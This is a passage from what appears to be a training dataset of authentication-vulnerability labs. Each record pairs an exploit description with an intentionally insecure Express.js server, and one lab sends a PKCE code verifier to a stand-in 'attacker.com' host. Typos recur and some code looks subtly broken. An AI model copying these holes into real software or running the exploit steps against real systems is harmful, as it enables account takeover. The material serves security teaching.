  "src code": "const express = require('express');\nconst crypto = require('crypto');\nconst app = express();\n\nconst facialHashes = {\n  admin: '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4'\n};\n\napp.post('/verify-biometric', (req, res) => {\n  const { image, hash } = req.body;\n  \n  // Critical flaw: Accepts precomputed hashes\n  const computedHash = hash || crypto.createHash('sha256').update(image).digest('hex');\n  \n  // Vulnerability: No anti-replay mechanism\n  if (Object.values(facialHashes).includes(computedHash)) {\n    res.send('Autnenticationsuccessful');\n  } else {\n    res.status(403).send('Biometric mismatch');\n  }\n});\n\napp.get('/biometric/safe', (req, res) => {\n  res.send('BIOMETRIC VAULT: DNA profiles downloaded');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Biometric Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Exploit a weak password policy to guess a user's password.(Weak Password Policy)",
  "Lab Description": "The application allows users to set very short and simple passwords with no complexity requirements. Try logging in as 'admin' by guessing a common password like '123'. This demonstrates how weak password policies can lead to unauthorized access.",
  "Vulnerability name": "Autnentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\nconst users = { 'admin': '123' };\napp.get('/login', (req, res) => {\n  res.send('<form method=\"post\"><input name=\"username\"><input name=\"password\" type=\"password\"><button type=\"submit\">Login</button></form>');\n});\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    res.send(`Welcome, ${username}!`);\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.listen(3001, () => console.log('Server running on port 3001'));"
},
{
  "Lab scenario": "Exploit insecure session management to reuse a session after logout. (Insecure Session Management)",
  "Lab Description": "The application fails to properly invalidate session cookies upon logout. Log in as 'user1', capture the session cookie, log out, then use the same cookie to access the account page again. This shows the importance of fully destroying sessions on logout.",
  "Vulnerability name": "Autnentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst session = require('express-session');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\napp.use(session({ secret: 'secret', resave: false, saveUninitialized: true }));\nconst users = { 'user1': 'password' };\napp.get('/login', (req, res) => {\n  res.send('<form method=\"post\"><input name=\"username\"><input name=\"password\" type=\"password\"><button type=\"submit\">Login</button></form>');\n});\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    req.session.username = username;\n    res.send('Logged in');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/account', (req, res) => {\n  if (req.session.username) {\n    res.send(`Welcome, ${req.session.username}!`);\n  } else {\n    res.status(401).send('Please log in');\n  }\n});\napp.get('/logout', (req, res) => {\n  req.session.username = null; // Not destroying the session\n  res.send('Logged out');\n});\napp.listen(3002, () => console.log('Server running on port 3002'));"
},
{
  "Lab scenario": "Exploit the lack of rate limiting to perform credential stuffing(Credential Stuffing)",
  "Lab Description": "The application does not limit the number of login attempts, allowing attackers to try multiple passwords for a known username. Try logging in as 'user1' with different passwords until you guess 'password123'. This highlights the need for rate limiting or account lockouts.",
  "Vulnerability name": "Autnentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\nconst users = { 'user1': 'password123' };\napp.get('/login', (req, res) => {\n  res.send('<form method=\"post\"><input name=\"username\"><input name=\"password\" type=\"password\"><button type=\"submit\">Login</button></form>');\n});\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    res.send(`Welcome, ${username}!`);\n  } else {\n    res.send('Invalid credentials'); // No rate limiting\n  }\n});\napp.listen(3003, () => console.log('Server running on port 3003'));"
},
{
  "Lab scenario": "Registration without email verification",
  "Lab Description": "A registration endpoint creates user accounts without verifying the email address. This allows attackers to create fake accounts without validation.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: no email verification\napp.post('/register', (req, res) => {\n  const { username, email, password } = req.body;\n  // Simulate account creation without email verification\n  res.send(`User ${username} registered successfully with email ${email}`);\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Insecure password recovery via static security question",
  "Lab Description": "The password recovery endpoint uses a static security question with a hardcoded answer. An attacker can easily guess or know the answer to reset a user's password.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: static security question\napp.post('/recoverPassword', (req, res) => {\n  const { username, securityAnswer, newPassword } = req.body;\n  // The security question is always 'What is your favorite color?' and answer is hardcoded as 'blue'\n  if (securityAnswer === 'blue') {\n    res.send(`Password for ${username} reset to ${newPassword}`);\n  } else {\n    res.send('Security answer incorrect');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Social login without email verification",
  "Lab Description": "A social login endpoint accepts user data from a third-party provider but does not verify the returned email address, allowing attackers to bypass proper account linking.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: social login does not verify email\napp.post('/socialLogin', (req, res) => {\n  const { provider, email } = req.body;\n  // Insecurely trusts the provided email\n  res.send(`Logged in with ${provider} account: ${email}`);\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Default admin password in configuration",
  "Lab Description": "The system loads administrative credentials from a configuration file that uses default values. An attacker who knows these defaults can gain admin access.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: default admin credentials exposed in code\nconst ADMIN_USER = 'admin';\nconst ADMIN_PASS = 'admin123';\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === ADMIN_USER && password === ADMIN_PASS) {\n    res.send('Admin login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "URL-based session token exposure",
  "Lab Description": "The application transmits session tokens in URL query parameters, making them visible in logs and browser history. This vulnerability can be exploited to hijack sessions.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst app = express();\n\n// Vulnerable: session token passed in URL\napp.get('/dashboard', (req, res) => {\n  const token = req.query.token;\n  // Insecurely trusts the token from the URL\n  if (token === 'session123') {\n    res.send('Dashboard accessed');\n  } else {\n    res.send('Access denied');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Flawed CAPTCHA implementation on login",
  "Lab Description": "The login form uses a weak CAPTCHA that always returns a fixed value, allowing attackers to bypass CAPTCHA verification during brute-force attacks.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: CAPTCHA always returns 'abcd'\napp.post('/login', (req, res) => {\n  const { username, password, captcha } = req.body;\n  if (username === 'user1' && password === 'pass1' && captcha === 'abcd') {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Exposed debug endpoint bypassing authentication",
  "Lab Description": "A debug mode endpoint exists that, when enabled, bypasses all Autnenticationchecks and automatically logs in the user.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: debug mode bypasses authentication\nconst DEBUG_MODE = true;\n\napp.post('/login', (req, res) => {\n  const { username } = req.body;\n  if (DEBUG_MODE) {\n    res.send(`Debug mode: ${username} logged in automatically`);\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Biometric Autnenticationfallback to hardcoded PIN",
  "Lab Description": "A biometric login system falls back to a PIN when biometric verification fails. The PIN is hardcoded and weak, allowing attackers to bypass biometric checks.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: fallback PIN is hardcoded\napp.post('/biometricLogin', (req, res) => {\n  const { biometric, pin } = req.body;\n  if (biometric || pin === '1111') {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Token expiration misconfiguration in authentication",
  "Lab Description": "The Autnenticationsystem issues tokens that never expire due to misconfiguration, allowing attackers to reuse tokens indefinitely.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst jwt = require('jsonwebtoken');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst SECRET = 'supersecret';\n\n// Vulnerable: token expiration set to never expire\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username && password) {\n    const token = jwt.sign({ username }, SECRET, { expiresIn: '1000000 years' });\n    res.json({ token });\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Predictable API key generation without randomness",
  "Lab Description": "An API key generation endpoint creates keys by concatenating fixed strings with the username. This predictable algorithm allows attackers to guess valid API keys.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: API key is generated predictably\napp.post('/generateApiKey', (req, res) => {\n  const { username } = req.body;\n  const apiKey = username + '_apikey';\n  res.send({ apiKey });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Misconfigured user role assignment on registration",
  "Lab Description": "A registration process incorrectly assigns administrative roles to new users due to a configuration error, allowing attackers to gain elevated privileges.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: role assignment error\napp.post('/register', (req, res) => {\n  const { username, password } = req.body;\n  // New users are mistakenly assigned 'admin' role\n  res.send(`User ${username} registered with role admin`);\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Password reset via fixed security answer",
  "Lab Description": "A password reset endpoint uses a fixed security question answer (e.g., 'pet's name' always 'fluffy') to authorize a reset, making it trivial for attackers to reset passwords.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: fixed security answer\napp.post('/resetPassword', (req, res) => {\n  const { username, securityAnswer, newPassword } = req.body;\n  if (securityAnswer === 'fluffy') {\n    res.send(`Password for ${username} reset to ${newPassword}`);\n  } else {\n    res.send('Incorrect security answer');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Token revocation failure on password change",
  "Lab Description": "A password change endpoint does not revoke the old Autnenticationtoken, leaving it valid after the password is updated. An attacker with the old token can continue to access the account.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: token not revoked after password change\napp.post('/changePassword', (req, res) => {\n  const { username, newPassword } = req.body;\n  // Simulate password change without revoking old token\n  res.send(`Password for ${username} changed to ${newPassword}. Old token remains valid.`);\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Open proxy for session tokens",
  "Lab Description": "A proxy service handling session tokens does not validate or isolate tokens properly, allowing attackers to intercept and reuse tokens from different sessions.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: proxy service simply forwards session tokens without validation\nlet sessionTokens = {};\n\napp.post('/proxyLogin', (req, res) => {\n  const { username } = req.body;\n  // Simplified: assign a token and store it in a global object\n  const token = username + '_token';\n  sessionTokens[token] = username;\n  res.send({ token });\n});\n\napp.get('/proxyDashboard', (req, res) => {\n  const token = req.headers.authorization;\n  if (sessionTokens[token]) res.send(`Welcome, ${sessionTokens[token]}`);\n  else res.send('Invalid token');\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Insecure MFA fallback via SMS without proper validation",
  "Lab Description": "A multi-factor Autnenticationsystem falls back to SMS verification when the primary factor fails, but the SMS code is not properly validated, allowing attackers to bypass MFA.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: SMS code fallback without proper validation\napp.post('/mfaLogin', (req, res) => {\n  const { username, password, smsCode } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    // Bypass MFA if any SMS code is provided\n    if (smsCode) res.send('MFA login successful');\n    else res.send('MFA required');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Steal Authorization Codes via Compromised PKCE Code Verifier",
  "Lab Description": "This lab's OAuth implementation combines open redirects with flawed Proof Key for Code Exchange (PKCE) validation. To solve: 1. Exploit open redirect in `/auth` to leak PKCE `code_verifier`. 2. Reconstruct code challenge via SHA-256. 3. Hijack authorization code flow. 4. Access SCIM API to elevate privileges. The system caches code verifiers for 5 minutes.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst crypto = require('crypto');\nconst app = express();\n\nlet codeVerifiers = new Map();\n\n// Vulnerable redirect endpoint\napp.get('/auth', (req, res) => {\n  const { redirect } = req.query;\n  // Critical flaw: No redirect URI validation\n  res.redirect(302, decodeURIComponent(redirect));\n});\n\napp.get('/oauth/authorize', (req, res) => {\n  const verifier = crypto.randomBytes(32).toString('hex');\n  const challenge = crypto.createHash('sha256').update(verifier).digest('base64url');\n  \n  codeVerifiers.set(challenge, verifier);\n  \n  // Leak verifier via redirect parameter\n  res.redirect(`/auth?redirect=http://attacker.com/?challenge=${challenge}&verifier=${verifier}`);\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { code, code_verifier } = req.body;\n  const challenge = crypto.createHash('sha256').update(code_verifier).digest('base64url');\n  \n  // Vulnerability: Accepts any verifier matching challenge\n  if (codeVerifiers.has(challenge)) {\n    res.json({ access_token: 'admin_system_token' });\n  } else {\n    res.status(401).send('Invalid PKCE');\n  }\n});\n\napp.post('/scim/Admin', (req, res) => {\n  res.send('Admin privileges granted - Lab solved');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`OAuth PKCE Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Forge Admin Tokens via JWK Header Injection",
  "Lab Description": "This lab's JWT implementation trusts arbitrary JWK headers in unverified tokens. Exploit: 1. Extract public key from /jwks.json. 2. Generate malicious key pair. 3. Forge JWT with `jwk` header containing your public key. 4. Access /admin/keys to rotate system certificates.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst publicKey = `-----BEGIN PUBLIC KEY-----\nMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAJb4...\n-----END PUBLIC KEY-----`;\n\n// Vulnerable JWT verification\nconst verifyToken = (token) => {\n  try {\n    // Critical flaw: Uses header-supplied JWK\n    return jwt.verify(token, (header, callback) => {\n      callback(null, header.jwk ? header.jwk.x5c[0] : publicKey);\n    }, { algorithms: ['RS256'] });\n  } catch (e) { return null; }\n};\n\napp.get('/admin/keys', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  const payload = verifyToken(token);\n  \n  if (payload?.role === 'admin') {\n    res.send('CRYPTO KEYS ROTATED: Lab solved');\n  } else {\n    res.status(403).send('Admin required');\n  }\n});\n\napp.get('/jwks.json', (req, res) => {\n  res.json({\n    keys: [{ \n      kty: 'RSA',\n      use: 'sig',\n      x5c: [publicKey]\n    }]\n  });\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`JWK Injection Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Bypachain SAML Validation via Canonicalization Attack",
  "Lab Description": "This lab's SAML processor uses inconsistent XML canonicalization methods between validation and processing. Exploit: 1. Capture valid assertion. 2. Inject malicious attributes in different namespace. 3. Preserve original signature via C14N whitespace manipulation. 4. Access /audit as Domain Admin.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst xmlCrypto = require('xml-crypto');\nconst xmldom = require('xmldom');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/saml/acs', (req, res) => {\n  const samlResponse = Buffer.from(req.body.SAMLResponse, 'base64').toString();\n  const doc = new xmldom.DOMParser().parseFromString(samlResponse);\n\n  // Validation uses exclusive C14N\n  const valid = xmlCrypto.checkSignature(samlResponse, {\n    getKey: (keyInfo) => publicKey,\n    canonAlgorithm: 'http://www.w3.org/2001/10/xml-exc-c14n#'\n  });\n\n  // Processing uses inclusive C14N\n  const assertion = doc.getElementsByTagName('saml:Assertion')[0];\n  const role = assertion.getElementsByTagName('admin:Role')[0]?.textContent;\n\n  if (valid && role === 'DomainAdmin') {\n    res.send('AUDIT SYSTEM ACCESS: Lab solved');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`SAML C14N Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Default admin credentials remain active",
  "Lab Description": "This lab demonstrates an Autnenticationvulnerability where the admin account still uses its default credentials. The system fails to force a change of these credentials, allowing an attacker to log in using the default username 'admin' and password 'admin123'. To solve the lab, simply log in using these default credentials and access the admin page.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// hard-coded admin credentials\nconst adminUser = { username: 'admin', password: 'admin123' };\n\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" required />\n            <input type=\"password\" name=\"password\" placeholder=\"Password\" required />\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    if (username === adminUser.username && password === adminUser.password) {\n        res.send(`Welcome, ${username}! You have accessed the admin panel.`);\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Default Credentials Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Login bypass via missing username validation",
  "Lab Description": "This lab demonstrates an Autnenticationflaw where the application fails to properly validate the username field. When the username is submitted empty, the system automatically logs the user in as 'guest'. An attacker can exploit this flaw by leaving the username blank, thereby bypassing Autnenticationand gaining access. To solve the lab, submit an empty username along with any password to access the protected resource.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Simulated user database\nconst users = [{ username: 'guest', password: 'guestpass' }];\n\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" />\n            <input type=\"password\" name=\"password\" placeholder=\"Password\" required />\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\napp.post('/login', (req, res) => {\n    let { username, password } = req.body;\n    // If username is empty, default to 'guest'\n    if (!username || username.trim() === '') {\n        username = 'guest';\n    }\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        res.send(`Welcome, ${username}! You have been logged in.`);\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Missing Username Validation Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Login bypass via flawed conditional logic",
  "Lab Description": "This lab demonstrates an Autnenticationbypass resulting from a coding error in the login function. Due to the misuse of the logical OR operator (||) instead of the logical AND (&&), the system incorrectly validates login attempts. As a result, an attacker can log in without knowing the correct password by exploiting this flaw. To solve the lab, use this logic flaw to gain access without valid credentials.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Simulated user database\nconst users = [{ username: 'admin', password: 'adminpass' }];\n\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" required />\n            <input type=\"password\" name=\"password\" placeholder=\"Password\" required />\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\n// Vulnerable login route using flawed conditional logic\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    // Vulnerability: Using OR (||) instead of AND (&&) causes the condition to be true if either part is true\n    if (username === 'admin' || password === 'adminpass') {\n        res.send(`Welcome, admin! (Logged in via flawed logic)`);\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Flawed Conditional Logic Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Insecure deserialization in session tokens",
  "Lab Description": "This lab demonstrates an Autnenticationbypass via insecure deserialization. The application stores session tokens as serialized JSON objects without proper validation. An attacker can craft a malicious token that modifies user properties (e.g., elevating privileges from 'user' to 'admin') and then use that token to access restricted resources. To solve the lab, exploit the insecure deserialization to forge a session token with administrative privileges.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Insecure session store that serializes user objects as JSON\napp.use(session({\n    secret: 'supersecretkey',\n    resave: false,\n    saveUninitialized: true,\n    cookie: { secure: false }\n}));\n\n// Simulated user database\nconst users = [{ username: 'carlos', role: 'user', password: 'secret' }];\n\n// Login route: upon login, the user object is stored in session as JSON\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        req.session.user = JSON.stringify(user);\n        res.send('Login successful');\n    } else {\n        res.status(401).send('Invalid credentials');\n    }\n});\n\n// Protected route: requires session token with role 'admin'\napp.get('/account', (req, res) => {\n    if (!req.session.user) return res.status(403).send('Access denied');\n    // Insecure deserialization\n    const user = JSON.parse(req.session.user);\n    if (user.role === 'admin') {\n        res.send('Welcome, admin! Access granted.');\n    } else {\n        res.status(403).send('Access denied');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Insecure Deserialization Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Insecure password change without current password verification",
  "Lab Description": "This lab demonstrates an Autnenticationvulnerability in the password change functionality. The application provides an endpoint to change a user's password but fails to verify the user's current password before updating it. This flaw allows an authenticated attacker to change any account's password without knowing the current password. To solve the lab, exploit this vulnerability to change the password of a target user and then log in with the new credentials.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\napp.use(session({ secret: 'supersecretkey', resave: false, saveUninitialized: true }));\n\n// Simulated user database\nlet users = [\n    { username: 'carlos', password: 'oldpassword' }\n];\n\n// Login route\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        req.session.user = user.username;\n        res.send(`Logged in as ${username}`);\n    } else {\n        res.status(401).send('Invalid credentials');\n    }\n});\n\n// Vulnerable password change endpoint (no current password verification)\napp.post('/change-password', (req, res) => {\n    const { username, newPassword } = req.body;\n    // Vulnerability: No check of the current password\n    const user = users.find(u => u.username === username);\n    if (user) {\n        user.password = newPassword;\n        res.send('Password changed successfully');\n    } else {\n        res.status(400).send('User not found');\n    }\n});\n\n// Protected resource\napp.get('/account', (req, res) => {\n    if (req.session.user) {\n        res.send(`Welcome to your account, ${req.session.user}`);\n    } else {\n        res.status(403).send('Access denied');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Password Change Vulnerability Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "API key collision due to weak randomness",
  "Lab Description": "This lab demonstrates an Autnenticationvulnerability where API keys are generated using a weak random number generator, resulting in predictable or colliding keys. An attacker can enumerate or guess a valid API key to impersonate another user. To solve the lab, exploit this vulnerability by determining a valid API key and using it to access a protected API endpoint.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst crypto = require('crypto');\nconst app = express();\n\napp.use(bodyParser.json());\n\n// Simulated user database with API keys generated by weak randomness\nlet users = [\n    { username: 'carlos', apiKey: crypto.randomBytes(2).toString('hex') }  // Only 4 hex digits\n];\n\n// Endpoint to get API key (insecure, just for lab demonstration)\napp.get('/get-api-key', (req, res) => {\n    const { username } = req.query;\n    const user = users.find(u => u.username === username);\n    if (user) {\n        res.send(`Your API key is: ${user.apiKey}`);\n    } else {\n        res.status(404).send('User not found');\n    }\n});\n\n// Protected endpoint that requires a valid API key\napp.get('/account', (req, res) => {\n    const { apiKey } = req.query;\n    const user = users.find(u => u.apiKey === apiKey);\n    if (user) {\n        res.send(`Welcome, ${user.username}! You have accessed the protected API endpoint.`);\n    } else {\n        res.status(403).send('Access denied. Invalid API key.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`API Key Collision Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Extended session timeout vulnerability enabling session hijacking",
  "Lab Description": "This lab demonstrates a vulnerability in session management. The application sets an excessively long session timeout without proper idle or absolute expiration. As a result, an attacker who intercepts a valid session cookie can reuse it to access protected resources even long after the user has logged in. To solve the lab, capture a valid session cookie and reuse it to access the victim's account page.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Session configuration with a long timeout (e.g., 24 hours)\napp.use(session({\n    secret: 'supersecretkey',\n    resave: false,\n    saveUninitialized: true,\n    cookie: { maxAge: 24 * 60 * 60 * 1000 } // 24 hours\n}));\n\n// Simulated user database\nconst users = [{ username: 'victim', password: 'password123' }];\n\n// Login route\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" required />\n            <input type=\"password\" name=\"password\" placeholder=\"Password\" required />\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        req.session.user = user.username;\n        res.send(`Logged in as ${user.username}. Your session id is ${req.sessionID}.`);\n    } else {\n        res.status(401).send('Invalid credentials');\n    }\n});\n\n// Protected account route\napp.get('/account', (req, res) => {\n    if (req.session.user) {\n        res.send(`Welcome, ${req.session.user}! This is your account page.`);\n    } else {\n        res.status(403).send('Access denied.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Extended Session Timeout Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Password recovery bypass via predictable secret question answers",
  "Lab Description": "This lab demonstrates a vulnerability in the password recovery process. The application uses a secret question to verify the identity of the user, but the answers are based on publicly available or easily guessable information. An attacker can exploit this flaw by guessing the correct answer to reset the password of a target user. To solve the lab, enumerate and submit the correct answer to the secret question, reset the password, and then log in to the victim's account.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Simulated user database with secret questions\nlet users = [\n    { username: 'carlos', password: 'oldpassword', secretQuestion: 'What is your favorite color?', secretAnswer: 'blue' }\n];\n\n// Request password reset endpoint\napp.get('/reset', (req, res) => {\n    res.send(`\n        <h2>Password Reset</h2>\n        <form method=\"POST\" action=\"/reset\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" required />\n            <button type=\"submit\">Reset Password</button>\n        </form>\n    `);\n});\n\napp.post('/reset', (req, res) => {\n    const { username } = req.body;\n    const user = users.find(u => u.username === username);\n    if (!user) return res.send('User not found');\n    // Display secret question for the user\n    res.send(`\n        <h2>Answer Secret Question</h2>\n        <p>${user.secretQuestion}</p>\n        <form method=\"POST\" action=\"/recover\">\n            <input type=\"hidden\" name=\"username\" value=\"${username}\" />\n            <input type=\"text\" name=\"answer\" placeholder=\"Answer\" required />\n            <button type=\"submit\">Submit Answer</button>\n        </form>\n    `);\n});\n\n// Recover 